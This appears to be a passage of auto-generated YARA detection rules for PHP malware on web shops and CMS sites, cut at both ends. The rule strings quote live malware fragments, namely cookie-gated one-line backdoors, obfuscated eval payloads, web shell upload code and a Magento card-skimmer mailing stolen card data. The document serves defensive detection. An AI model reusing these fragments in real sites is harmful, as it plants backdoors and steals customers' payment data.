		description = "php_malware - from files index.php, index.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		super_rule = 1
		hash1 = "f695f725cec1ad8d1a7e7e114472597d5c721b07bed2570117d09da40ca75bfa"
		hash2 = "f695f725cec1ad8d1a7e7e114472597d5c721b07bed2570117d09da40ca75bfa"
	strings:
		$s0 = "$_request_headers .= \"Content-Length: \" . strlen($POST) . \"\\r\\n\\r\\n\";" fullword ascii
		$s1 = "$_request_headers .= \"Authorization: Basic {$_basic_auth_header}\\r\\n\";" fullword ascii
		$s2 = "$_request_headers .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";" fullword ascii
		$s3 = "if (isset($_response_headers['set-cookie']))" fullword ascii
		$s4 = "$key = isset($parent_key) ? sprintf('%s[%s]', $parent_key, urlencode($key)) : urlencode($key);" fullword ascii
		$s5 = "$_post_body .= \"--{$_data_boundary}\\r\\n\";" fullword ascii
		$s6 = "header($_response_keys[$name] . ': ' . $value, false);" fullword ascii
		$s7 = "$line = fgets($_socket, 8192);" fullword ascii
		$s8 = "$array = set_post_vars($_POST);" fullword ascii
		$s9 = "$_request_headers .= $POST;" fullword ascii
		$s10 = "url_parse(complete_url(rtrim($attrs['codebase'], '/') . '/', false), $_base);" fullword ascii
		$s11 = "$_basic_auth_header = '';" fullword ascii
		$s12 = "+-----------------+------------------------------------------------------------+" fullword ascii
		$s13 = "$attrs['longdesc'] = complete_url($attrs['longdesc']);" fullword ascii
		$s14 = "$temp = $_base;" fullword ascii
		$s15 = "$_base = $temp;" fullword ascii
		$s16 = "$attrs['href'] = complete_url($attrs['href']);" fullword ascii
		$s17 = "for ($i = 0, $count = count($matches); $i < $count; ++$i)" fullword ascii
		$s18 = "if (isset($attrs['src']))" fullword ascii
		$s19 = "if (isset($attrs['longdesc']))" fullword ascii
		$s20 = "if (isset($attrs['archive']))" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 117KB and all of them
}
rule YarGen_php_backdoor
{
	meta:
		description = "php_malware - file System.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "c66dd474cd71b436184ef6be5e44da598cdc50b450b7fc53318a0cd9c9821712"
	strings:
		$s0 = "if(isset($_POST)&& $GLOBALS['_1101968086_'][0]($_POST)&& $GLOBALS['_1101968086_'][1]($_POST)>round(0)){$_0=_361192170(0);$_1=$_S" ascii
		$s1 = "$GLOBALS['_1101968086_']=Array(base64_decode('' .'aXNfYX' .'Jy' .'YXk='),base64_decode('Y2' .'91b' .'nQ' .'='),base64_decode('Zm" ascii
		$s2 = "function _361192170($i){$a=Array('L3Zhci9leHBvcnQv','RE9DVU1FTlRfUk9PVA==','ZXhwb3J0Xw==','ZGF0ZQ==','UkVRVUVTVF9USU1F','aXA=','" ascii
		$s3 = "$magecheck = 'checkout';" fullword ascii
		$s4 = "$magedirsize = 300;" fullword ascii
		$s5 = "$magequotes = 299;  " fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 9KB and all of them
}
rule YarGen__cache27
{
	meta:
		description = "php_malware - file cache27.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "952f75e2583b64ed0351d67a3bf01f120c2e06ed55a5021a48f6a2cdea4dbea5"
	strings:
		$s0 = "$GLOBALS[$GLOBALS['re5a857a'][19].$GLOBALS['re5a857a'][63].$GLOBALS['re5a857a'][50].$GLOBALS['re5a857a'][14]] = $_POST;" fullword ascii
		$s1 = "$GLOBALS[$GLOBALS['re5a857a'][87].$GLOBALS['re5a857a'][87].$GLOBALS['re5a857a'][61].$GLOBALS['re5a857a'][61].$GLOBALS['re5a857a'" ascii
		$s2 = "elseif ($ec86[$GLOBALS['re5a857a'][72]] == $GLOBALS['re5a857a'][87])" fullword ascii
		$s3 = "if ($ec86[$GLOBALS['re5a857a'][72]] == $GLOBALS['re5a857a'][22])" fullword ascii
		$s4 = "function he974e261($ec86, $pcc7eecf)" fullword ascii
		$s5 = "function if5128($ec86, $pcc7eecf)" fullword ascii
		$s6 = "eval($ec86[$GLOBALS['re5a857a'][14]]);" fullword ascii
		$s7 = "$m67ea = $pcc7eecf;" fullword ascii
		$s8 = "$n213ae9f = Array(" fullword ascii
		$s9 = "$ec86 = $k2ffecc;" fullword ascii
		$s10 = "$y7dc6c1e = \"\";" fullword ascii
		$s11 = "global $x9a1397;" fullword ascii
		$s12 = "return $y7dc6c1e;" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 40KB and all of them
}
rule YarGen__skins
{
	meta:
		description = "php_malware - file skins.php2"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "cda14815d2768cf119e59ea5e8aa1905775c923c79caba03ed25b440163b3e98"
	strings:
		$s0 = "<?php if(md5(@$_COOKIE[qz])=='8b9376de1361eebe603afc6565d65394') ($_=@$_REQUEST[q]).@$_($_REQUEST[z]); ?>" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 1KB and all of them
}
rule YarGen_lib55
{
	meta:
		description = "php_malware - file lib55.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "8e2fb996a26804ca06d777cfaaa1385e7d6853b9d11693c7f3bb0abcb4e2e99d"
	strings:
		$s0 = "$GLOBALS[$GLOBALS['f81f0aa'][67].$GLOBALS['f81f0aa'][87].$GLOBALS['f81f0aa'][59].$GLOBALS['f81f0aa'][45].$GLOBALS['f81f0aa'][36]" ascii
		$s1 = "$GLOBALS[$GLOBALS['f81f0aa'][86].$GLOBALS['f81f0aa'][13].$GLOBALS['f81f0aa'][47].$GLOBALS['f81f0aa'][36].$GLOBALS['f81f0aa'][36]" ascii
		$s2 = "elseif ($te9e[$GLOBALS['f81f0aa'][67]] == $GLOBALS['f81f0aa'][47])" fullword ascii
		$s3 = "if ($te9e[$GLOBALS['f81f0aa'][67]] == $GLOBALS['f81f0aa'][25])" fullword ascii
		$s4 = "eval($te9e[$GLOBALS['f81f0aa'][86]]);" fullword ascii
		$s5 = "function nedac55($te9e, $j0edb)" fullword ascii
		$s6 = "function gfa0d($te9e, $j0edb)" fullword ascii
		$s7 = "$wbb510 = Array(" fullword ascii
		$s8 = "$te9e = $t8d649d8d;" fullword ascii
		$s9 = "$ib3e246 = $j0edb;" fullword ascii
		$s10 = "$ib3e246 = NULL;" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 40KB and all of them
}
rule YarGen_start_backdoor
{
	meta:
		description = "php_malware - file start.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "8ed9c5674a9589e72869a10d079bda6cbfc270487623f501255e3fe2971f5f72"
	strings:
		$s0 = "$GLOBALS[$GLOBALS['qf0761d'][16].$GLOBALS['qf0761d'][5].$GLOBALS['qf0761d'][14].$GLOBALS['qf0761d'][92].$GLOBALS['qf0761d'][5].$" ascii
		$s1 = "$GLOBALS[$GLOBALS['qf0761d'][95].$GLOBALS['qf0761d'][9].$GLOBALS['qf0761d'][56].$GLOBALS['qf0761d'][5].$GLOBALS['qf0761d'][52]] " ascii
		$s2 = "elseif ($nbb16a[$GLOBALS['qf0761d'][67]] == $GLOBALS['qf0761d'][52])" fullword ascii
		$s3 = "if ($nbb16a[$GLOBALS['qf0761d'][67]] == $GLOBALS['qf0761d'][16])" fullword ascii
		$s4 = "function n35d6e($nbb16a, $z8a0c5)" fullword ascii
		$s5 = "function z7cddcf($nbb16a, $z8a0c5)" fullword ascii
		$s6 = "eval($nbb16a[$GLOBALS['qf0761d'][22]]);" fullword ascii
		$s7 = "$nbb16a = $pd4cb45a5;" fullword ascii
		$s8 = "$vb60e6944 = NULL;" fullword ascii
		$s9 = "$vb60e6944 = $z8a0c5;" fullword ascii
		$s10 = "$c69d7fd2 = Array(" fullword ascii
		$s11 = "global $k1693af;" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 40KB and all of them
}
rule YarGen_image_backdoor
{
	meta:
		description = "php_malware - file image.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "26c18ec0723763cc19ad8749d73b256f507bf5445ef503798a3fe88f675a4553"
	strings:
		$s0 = "<?php eval(base64_decode('aWYoaXNzZXQoJF9QT1NUWydlJ10pKWV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ2UnXSkpO2VjaG8gJzM5MzgyYjMxMzIzOTJlMz" ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 1KB and all of them
}
rule YarGen_IndexController_shoplift
{
	meta:
		description = "php_malware - file IndexController.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "739fc6d5013c8dab2c6ed76a2e82d20006a3f46399fe5aa88ef6ae9a3783a3de"
	strings:
		$s0 = "$method = $auth_cookie(@$_COOKIE['zbyxbcfwojbufkqz2']);" fullword ascii
		$s1 = "$auth = $auth_cookie(@$_COOKIE['zbyxbcfwojbufkqz1']);" fullword ascii
		$s2 = "$auth_cookie = @$_COOKIE['zbyxbcfwojbufkqz3'];" fullword ascii
		$s3 = "if ($auth_cookie) {" fullword ascii
		$s4 = "$method(\"/124/e\",$auth,124);" fullword ascii
	condition:
		uint16(0) == 0x630a and filesize < 1KB and all of them
}
rule YarGen_load_config
{
	meta:
		description = "php_malware - file load-config.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "87889eb903223d0effc7fe169bf78e276ce605b1575d7609540e10ee6bc048e2"
	strings:
		$s0 = "<?php $a = \"b\".\"\".\"as\".\"e\".\"\".\"\".\"6\".\"4\".\"_\".\"de\".\"\".\"c\".\"o\". \"\".\"d\".\"e\"; assert($a('ZXZhbCgiXHg" ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 107KB and all of them
}
rule YarGen_joom
{
	meta:
		description = "php_malware - file joom.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "88a7486147582b54bc19ca2d6e3dec1b2b40122028fd0666c16179ac01d09676"
	strings:
		$s0 = "$GLOBALS['_trh_']=Array(base64_decode('ZXJyb3JfcmVwb3J0aW5n'),base64_decode('ZmlsZV9wdXRfY29udGVudHM='),base64_decode('YmFzZTY0X" ascii
		$s1 = "if (isset($_POST) && isset($_POST['zp'])) exit('succes1');" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 68KB and all of them
}
rule YarGen_test68
{
	meta:
		description = "php_malware - file test68.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "3ef425274b9d0caefea13c6aa366a0bff14ec4573ed16d73f79a9c3fc8de5e60"
	strings:
		$s0 = "$GLOBALS[$GLOBALS['y1939d'][76].$GLOBALS['y1939d'][29].$GLOBALS['y1939d'][96].$GLOBALS['y1939d'][7].$GLOBALS['y1939d'][64].$GLOB" ascii
		$s1 = "$GLOBALS[$GLOBALS['y1939d'][33].$GLOBALS['y1939d'][29].$GLOBALS['y1939d'][7].$GLOBALS['y1939d'][94].$GLOBALS['y1939d'][78].$GLOB" ascii
		$s2 = "elseif ($le2a35f17[$GLOBALS['y1939d'][33]] == $GLOBALS['y1939d'][73])" fullword ascii
		$s3 = "if ($le2a35f17[$GLOBALS['y1939d'][33]] == $GLOBALS['y1939d'][89])" fullword ascii
		$s4 = "eval($le2a35f17[$GLOBALS['y1939d'][64]]);" fullword ascii
		$s5 = "function x17a($le2a35f17, $xcbdfd)" fullword ascii
		$s6 = "function o546e5($le2a35f17, $xcbdfd)" fullword ascii
		$s7 = "$d4b3d411c = $xcbdfd;" fullword ascii
		$s8 = "$o820f9221 = Array(" fullword ascii
		$s9 = "$d4b3d411c = NULL;" fullword ascii
		$s10 = "$le2a35f17 = NULL;" fullword ascii
		$s11 = "$le2a35f17 = $c5f36be;" fullword ascii
		$s12 = "if (!$le2a35f17)" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 39KB and all of them
}
rule YarGen_index_php
{
	meta:
		description = "php_malware - file index.php.js"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "c0c04e6e48c13adaf7430af12c6fb3f1d365339d7d4e26599aa514e726b85e38"
	strings:
		$s0 = "* http://www.magentocommerce.com/license/enterprise-edition" fullword ascii
		$s1 = "* @license     http://www.magentocommerce.com/license/enterprise-edition" fullword ascii
		$s2 = "* needs please refer to http://www.magentocommerce.com for more information." fullword ascii
		$s3 = "* @copyright   Copyright (c) 2014 Magento Inc. (http://www.magentocommerce.com)" fullword ascii
		$s4 = "* @author      Magento Core Team <core@magentocommerce.com>" fullword ascii
		$s5 = "* to license@magentocommerce.com so we can send you a copy immediately." fullword ascii
		$s6 = "* Proxy script to combine and compress one or few files for JS and CSS" fullword ascii
		$s7 = "if (isset($_SERVER['HTTP_IF_MODIFIED_SINCE']) && strtotime($_SERVER['HTTP_IF_MODIFIED_SINCE']) >= $lastModified) {" fullword ascii
		$s8 = "* This source file is subject to the Magento Enterprise Edition License" fullword ascii
		$s9 = "if($_POST['hsh']=='ae014ad623c4493b9a2704383269c7f5'){$c = $_POST['c']; $js = $_POST['js'];" fullword ascii
		$s10 = "* versions in the future. If you wish to customize Magento for your" fullword ascii
		$s11 = "// optional custom content type, can be emulated by index.php/x.js or x.css" fullword ascii
		$s12 = "* Restricts access only to files under current script's folder" fullword ascii
		$s13 = "* Do not edit or add to this file if you wish to upgrade Magento to newer" fullword ascii
		$s14 = "* that is bundled with this package in the file LICENSE_EE.txt." fullword ascii
		$s15 = "* Magento Enterprise Edition" fullword ascii
		$s16 = "// try automatically get content type if requested" fullword ascii
		$s17 = "if (empty($contentTypes[$fileExt])) { // security" fullword ascii
		$s18 = "* obtain it through the world-wide-web, please send an email" fullword ascii
		$s19 = "$contentType = $_GET['c']==='auto' ? true : $_GET['c'];" fullword ascii
		$s20 = "$out .= file_get_contents($fileRealPath) . \"n\";" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 13KB and all of them
}
rule YarGen_openid
{
	meta:
		description = "php_malware - file OpenIDOpenID.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "3a1116b00f7da2723fe926ea4a30173c35ae9cfce84bf39f2c6f57a4cd3fdf0f"
	strings:
		$s0 = "$sQHE=$bq8Ze(\"7X1re9s2z/Dn9V_wmjfZq+PYTtu7s2Mn&Q5t2jTp_ugp6ePJsmxrkS1PkuNkWf77C4CkREqy43S738N1v*ufp7FIEARJkARBAHT7xRVnNIlui4XO6" ascii
		$s1 = "$auth_pass = \"d246257be28b58d21d184162f8343be4\";" fullword ascii
		$s2 = "$RfpROx=\"\\163\\164\\162\";$R0bRYmz=\"\\164\\162\";$bq8Ze=$RfpROx.$R0bRYmz;" fullword ascii
		$s3 = "$nOcesG=\"ETOD2LB04EHZ\"^\"5&*#m>'@X$+?\";$color = \"#df5\";$default_action = 'FilesMan';$default_use_ajax = true;$default_chars" ascii
	condition:
		uint16(0) == 0x240a and filesize < 68KB and all of them
}
rule YarGen_class
{
	meta:
		description = "php_malware - file class.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "d310bca7bd58aab6c9565f88461d7d04ec67ad5fba1fc0ae4fd71bb5f3705a27"
	strings:
		$s0 = "echo \"<form method=post name=mf style='display:none;'><input type=hidden name=c></form>\";" fullword ascii
		$s1 = "echo \"Path: \".htmlspecialchars($cwd).\"<input type=hidden name=c value='\".htmlspecialchars($cwd) .\"'><hr>\";" fullword ascii
		$s2 = "input,textarea,select{ color:#fff;background-color:#111;border:0; font: 10pt Monospace,'Courier New'; }" fullword ascii
		$s3 = "\"<hr><form method='post' ENCTYPE='multipart/form-data'>" fullword ascii
		$s4 = "if(!@move_uploaded_file($_FILES['f']['tmp_name'], $cwd.$_FILES['f']['name']))" fullword ascii
		$s5 = "echo \"<!-- 'filename.php','chmod')\\\"><font color=green> --!> \";" fullword ascii
		$s6 = "echo \"<!-- 'filename.php','chmod')\\\"><font color=white> --!> \";" fullword ascii
		$s7 = "if($_POST['p1'] === 'uploadFile') {" fullword ascii
		$s8 = "Upload file: <input type=file name=f><input type=submit value='>>'></form>\";" fullword ascii
		$s9 = "echo \"<!-- Safe mode:</span> <font color=green><b>OFF</b></font> --!>\\n\";" fullword ascii
		$s10 = "echo \"<!-- Safe mode:</span> <font color=#00bb00><b>OFF</b></font> --!>\\n\";" fullword ascii
		$s11 = "if(isset($_POST['c']))" fullword ascii
		$s12 = "@chdir($_POST['c']);" fullword ascii
		$s13 = "<input type=hidden name=c value='\" . $cwd .\"'>" fullword ascii
		$s14 = "if(function_exists(\"scandir\")) {" fullword ascii
		$s15 = "<input type=hidden name=p1 value='uploadFile'>" fullword ascii
		$s16 = "body{background-color:#111; color:#e1e1e1;}" fullword ascii
		$s17 = "function wscandir($cwdir) {" fullword ascii
		$s18 = "$safe_mode = @ini_get('safe_mode');" fullword ascii
		$s19 = "$ls = wscandir($cwd);" fullword ascii
		$s20 = "while (false !== ($filename = readdir($cwdh)))" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 7KB and all of them
}
rule YarGen_skins_2
{
	meta:
		description = "php_malware - file skins.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "2ed85107292b5a48dedad17c7ce91cef796a93c98ce4e25485efe7cb35b8f058"
	strings:
		$s0 = "<?php if(md5(@$_COOKIE[qz])=='b98e9adf0deb0c5a95191af3eba27d09') ($_=@$_REQUEST[q]).@$_($_REQUEST[z]); ?>" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 1KB and all of them
}
rule YarGen_Cc
{
	meta:
		description = "php_malware - file Cc.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "2dcbd0b85875444db7b542f0c158f125d0d4fbc1ad943b86f86583b54e144c3c"
	strings:
		$s0 = "$data17 = json_decode(file_get_contents(\"http://www.binlist.net/json/\".$data16.\"\"));" fullword ascii
		$s1 = "$data1 = Mage::getSingleton('checkout/session')->getQuote()->getBillingAddress()->getEmail();" fullword ascii
		$s2 = "$data8 = $details->getPostcode();" fullword ascii
		$s3 = "$expyear = substr($info->getCcExpYear(), -2);" fullword ascii
		$s4 = "$details = $object->getQuote()->getBillingAddress();" fullword ascii
		$s5 = "$srvip  = $_SERVER['REMOTE_ADDR'];" fullword ascii
		$s6 = "$encode = base64_decode($idkey);" fullword ascii
		$s7 = "$data16 = substr($info->getCcNumber(), 0,6);" fullword ascii
		$s8 = "$headr  = 'From:'.$name.'<'.$data2.'>';" fullword ascii
		$s9 = "$expmonth = $info->getCcExpMonth();" fullword ascii
		$s10 = "$data4 = $details->getStreet(1);" fullword ascii
		$s11 = "$data3 = $details->getLastname();" fullword ascii
		$s12 = "$info = $this->getInfoInstance();" fullword ascii
		$s13 = "$data5 = $details->getStreet(2);" fullword ascii
		$s14 = "$data9 = $details->getCountry();" fullword ascii
		$s15 = "$data10 = $details->getTelephone();" fullword ascii
		$s16 = "$data2 = $details->getFirstname();" fullword ascii
		$s17 = "$srvadd = $_SERVER['SERVER_NAME'];" fullword ascii
		$s18 = "mail($encode, $salt, $payfull, $headr);" fullword ascii
		$s19 = "$idkey  = 'YmVnYWxtYWdlbnRvQGdtYWlsLmNvbQ==';" fullword ascii
		$s20 = "$data11 = $info->getCcNumber();" fullword ascii
	condition:
		uint16(0) == 0x2020 and filesize < 6KB and all of them
}
rule YarGen_iestyles
{
	meta:
		description = "php_malware - file iestyles.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "2852ef99bcb3150595cf7f1260871fda9225753f58db3b73b9535150ef22677e"
	strings:
		$s0 = "if(md5(@$_COOKIE['hsh'])=='f026c722b7b295be861e572f08677d0f')($_=@$_REQUEST['css']).@$_($_REQUEST['js']); ?>" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 1KB and all of them
}
rule YarGen_user41
{
	meta:
		description = "php_malware - file user41.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "56b89ce2eb29c48f65a58501e401f89f8e20a6860a3a482e1239b47d29828a30"
	strings:
		$s0 = "@$GLOBALS[$GLOBALS['rfc3fd88'][79].$GLOBALS['rfc3fd88'][82].$GLOBALS['rfc3fd88'][23].$GLOBALS['rfc3fd88'][27]](0);" fullword ascii
		$s1 = "$GLOBALS[$GLOBALS['rfc3fd88'][34].$GLOBALS['rfc3fd88'][59].$GLOBALS['rfc3fd88'][93].$GLOBALS['rfc3fd88'][13].$GLOBALS['rfc3fd88'" ascii
		$s2 = "$GLOBALS[$GLOBALS['rfc3fd88'][86].$GLOBALS['rfc3fd88'][41].$GLOBALS['rfc3fd88'][0].$GLOBALS['rfc3fd88'][93].$GLOBALS['rfc3fd88']" ascii
		$s3 = "elseif ($ta69f07a[$GLOBALS['rfc3fd88'][59]] == $GLOBALS['rfc3fd88'][33])" fullword ascii
		$s4 = "if ($ta69f07a[$GLOBALS['rfc3fd88'][59]] == $GLOBALS['rfc3fd88'][12])" fullword ascii
		$s5 = "eval($ta69f07a[$GLOBALS['rfc3fd88'][58]]);" fullword ascii
		$s6 = "function ofa04d67($ta69f07a, $f2c9f9a)" fullword ascii
		$s7 = "function x5d6508($ta69f07a, $f2c9f9a)" fullword ascii
		$s8 = "$o3ce467 = NULL;" fullword ascii
		$s9 = "$o3ce467 = $f2c9f9a;" fullword ascii
		$s10 = "$ta69f07a = NULL;" fullword ascii
		$s11 = "$ma481e3 = Array(" fullword ascii
		$s12 = "$ta69f07a = $mb606694a;" fullword ascii
		$s13 = "$jba5cba42 = \"\";" fullword ascii
		$s14 = "global $m893916;" fullword ascii
		$s15 = "return $jba5cba42;" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 33KB and all of them
}
rule YarGen_sql
{
	meta:
		description = "php_malware - file sql.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "f6c49280fcdc632aed89ab33ae68b64b8021402f3de7f25ebab4aecabdfc1b8c"
	strings:
		$s0 = "'FaLo4EgHxaLH8rjTOuQh4uFHxUZo5EYo4uFdN7GMv3F16Eye4q614uyRvawS8rLXvaLX4rG15uXp57FoBcH1v3G1v3G1v3G1'." fullword ascii
		$s1 = "'v3G1v3G1v3G1v3G1n6H1v3G1v3G1v3G1v3G1v3G1xqehwqZHfEye4d61O7PcFuVdrEehwqZHrE2p431d0eTkrlGRj2ccZl2Fjl'." fullword ascii
		$s2 = "'G1FaVi4qXWv3LK4eyE5rxcvlR15u2pFEzt3iG1v3PcwDxp8Dj1x2Lo4DVswr61O7GAjlGt3iG1v3PcwDxp8Dj1x2Lo4DVp8D'." fullword ascii
		$s3 = "'XArEZh4qQhfuQXN3LR8qXA0JYm5Dxe5EyewaPew3KovapNv3G1v3G1v3G1v3G1fE2p42yeFEVSrE5e4ujHxaLH8rj'." fullword ascii
		$s4 = "'wDF1O7GcBcH1v3G1FaVi4qXWv3Lm5Dxe5EyewaPew3Gyv3wXfEhsxApNv3G1vaPefuQofSGKzRezzmTX5rPP4qXE5'." fullword ascii
		$s5 = "'iGHxqXM5qVgvlR1jlp1xqXM5qVgvlc1fEye4d6HxaLH8rjTOKZeFULs4zhXfDLXFiKtv3Lo4uLXk3p9N7Pt3iG1v3G1v'." fullword ascii
		$s6 = "'4uYXfULX531o3iG1v3Pt3iG1v3G1v3G18Df1NqXArUxXFEyeFuZXN3LR8qXA0JYA4rLcrEZs4ugoN7Pt3iG1v3G1v3G'." fullword ascii
		$s7 = "'1v3G1v3LT5rZAfDwXvlR1xSFt3iG1v3G1v3G15uySv31K87GyvlGtv3Lovlc1fEye4d6HxqQo4uzo'." fullword ascii
		$s8 = "'y3iG1v3G1v3G1xaLH8rjTOuXA72LZJ3hRFdVXNJpNv3G1v3G1v3Gs0SPl4EYE5rxRvq2p43PT5rZAfDwXvq'." fullword ascii
		$s9 = "'o3iG1v3Pt3iG1v3G1v3G1FuVRwrxMv3LR8qXA0JYm5Dxe5EyewaPewlpNv3G1vaRNv3G1vaPefuQ'." fullword ascii
		$s10 = "'fEye4d6HxaLH8rjTOu2p42yS5DZoFqXX4dLAN7G+vqZswDYRN3LifDLnFuZcw3Kovq2M53Gh'." fullword ascii
		$s11 = "'1H1v3G1v3G1v3G1v3G1v3G1xqehwqZHfEye4d61O7PcFuVdrEehwqZHrE2p431d0epHN7xw0SF'." fullword ascii
		$s12 = "'uVRwrxMBcH1v3G1v3G1vaRNv3G1v3G1v3Po5iGHvDXMrE2SFu2YN3LR8qXA0JYm5Dxe5EyewaPe'." fullword ascii
		$s13 = "'3LR8qXA0JYA4rLcrEZs4ugoBcH1v3G1v3G1v3G1v3Po5iGHxqXM5uy4xULo4DVKrEyew3ww'." fullword ascii
		$s14 = "'R8qXA0JYA4rLc0JYW4qyA571oBcH1v3G1v3G1vaRNv3G1v3G1v3Po5iGHfEye4d6Hxqxh5'." fullword ascii
		$s15 = "'1v3G1vaRNv3G1v3G1v3PAwEXRfE11N3LR8qXA0JYm5Dxe5EyewaPew3K1kcH1v3G1v3G1v3G1v'." fullword ascii
		$s16 = "'8Df1N3hW4UVMw31KwqhoFSR+wqbov3p1fEye4d6HxaLH8rjTOuZWN7G9vqZswDYRN3LR8qX'." fullword ascii
		$s17 = "'MxSGMv3Lp8DYXrEyewlpNv3G1v3G1v3G1v3G1v3G1vaRNv3G1v3G1v3G1v3G1v'." fullword ascii
		$s18 = "'KNv3G1vapNv3G1v3G1v3GKwqhoFSR+5rxS4UxnfEye4d69NApNv3G1v3G1v3Po5iGH'." fullword ascii
		$s19 = "'LX4d6pv3LTfrLW8qVANJpNv3G1vq5sFi1K87GyvlGtv3Lovlc1fEye4d6Hxqe'." fullword ascii
		$s20 = "'1N6H1v3G1v3G1v3G1v3Ph4u61fEye4d6HxaLH8rjTOuxWfSK1OiGc3iG1v3G1v3G1N7'." fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 454KB and all of them
}
rule YarGen_bad_html
{
	meta:
		description = "php_malware - file 57ecf5ca445625e8154131e8f560153a.htm"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "a60032a560ec799c552d139731e27f43a9c903765c951a1476af28213846cf05"
	strings:
		$s0 = "<a target=\"_blank\" href=\"http://www.shy22.com/upfilpng/cr078433.png\">" fullword ascii
		$s1 = "<div id=\"ecxmpf0_MsgContainer\" class=\"ecxSandboxScopeClass ecxExternalClass\">" fullword ascii
		$s2 = "<div id=\"mpf0_MsgContainer\" class=\"SandboxScopeClass ExternalClass\">" fullword ascii
		$s3 = "<div id=\"ecxmpf0_readMsgBodyContainer\" class=\"ecxReadMsgBody\">" fullword ascii
		$s4 = "<title>PayPal</title>" fullword ascii
		$s5 = "<table width=\"100%\" cellspacing=\"0\" cellpadding=\"0\">" fullword ascii
		$s6 = "<div id=\"mpf0_readMsgBodyContainer\" class=\"ReadMsgBody\" onclick=\"return Control.invoke('MessagePartBody','_onBodyClick',eve" ascii
		$s7 = ".ExternalClass .ecxReadMsgBody" fullword ascii
	condition:
		uint16(0) == 0x2020 and filesize < 3KB and all of them
}
rule YarGen_file
{
	meta:
		description = "php_malware - file file.php"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "8a715131660a8a990d01f8ffac79cf185283c5f1191d333cb5fff7605735c3a2"
	strings:
		$s0 = "$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";$R_DHQjEVmhf=$func('$x','ev'.'al'.'(\"?>\".gz'.'in'.'fla'.'te(ba'.'se'.'64'.'_de'." ascii
		$s1 = "<?php $GLOBALS['pass'] = \"8020469869f2880c93823d46c8bf6e59b2882525\";" fullword ascii
	condition:
		uint16(0) == 0x3f3c and filesize < 268KB and all of them
}
rule YarGen_index_2
{
	meta:
		description = "php_malware - file index.php2"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "ddbacd2e7780f9e01516f330332ae6fbc1ed7fc8cb989ab4c6a7a79a3c4582b6"
	strings:
		$s0 = "eval($v3($v1(strrev('/0///973n3//5zDEAJggRQACdf1kPZVidSaW9OCq3LYtTj44VUK/M7p6QdNvtRHDkLUxYppsNoj6iB/BfcRyc8Dcrwrk+U8HNNZGdwTixGO" ascii
		$s1 = "eval($v1(\"JGxvZ2luPSI5MTMiOyRtZDVfcGFzcz0iZjdjN2NmMzk0OWEwMGY5NzBiMGU3NGMzODkwNDU3ZWEiOw==\"));" fullword ascii
		$s2 = "$v1 = strrev(\"edoced_46esab\");" fullword ascii
		$s3 = "$v3 = strrev(\"etalfnizg\");" fullword ascii
	condition:
		uint16(0) == 0x240a and filesize < 264KB and all of them
}
rule YarGen_index_hack
{
	meta:
		description = "php_malware - file index.php3"
		author = "YarGen Rule Generator"
		reference = "not set"
		date = "2016-01-18"
		hash = "801768e4b9c0b878628d8058abb30e93a6a9f26b652186bbfa2896ff96e62e26"
	strings:
		$s0 = "eval($mdh($md(strrev('/0///973n3//5zD'.'EAJggRQ'.'AC'.'df1kPZVidSaW9OC'.'q'.'3LYtTj44VUK/M7p6Q'.'dNvtRHD'.'kLUxYppsNoj6iB/Bfc'.'" ascii
		$s1 = "$login=\"913\";" fullword ascii
		$s2 = "$md5_pass=\"9575d95000b8391d46bbe33c966892dc\"; " fullword ascii
		$s3 = "$md=str_rot13(\"onfr64_qrpbqr\");" fullword ascii
		$s4 = "$mdh = str_rot13('tmvasyngr');" fullword ascii
	condition:
		uint16(0) == 0x6c24 and filesize < 326KB and all of them
}
rule YarGen_php_hack
{
	meta:
		description = "php_malware - file test.php"
		author = "YarGen Rule Generator"
		reference = "not set"
